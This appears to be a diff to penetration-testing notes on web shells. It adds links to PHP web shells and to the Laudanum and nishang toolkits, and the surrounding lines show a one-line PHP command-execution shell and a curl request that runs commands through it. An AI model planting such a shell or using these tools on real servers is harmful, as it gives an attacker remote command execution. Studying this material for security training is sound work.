@@ -23,6 +23,9 @@ A web shell script is typically a one-liner that is very short and can be memori
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
+- [Pentesmonkey webshell](pentesmonkey.md).
+- [WhiteWinterWolf webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php).
+
 ### jsp
 
 ```jsp
@@ -66,3 +69,12 @@ curl http://SERVER_IP:PORT/shell.php?cmd=id
 ```
 
 A  benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. 
+
+
+## Tools
+
+[About webshells](https://github.com/BlackArch/webshells).
+
+[Laudanum](laudanum.md)
+
+[nishang](nishang.md)
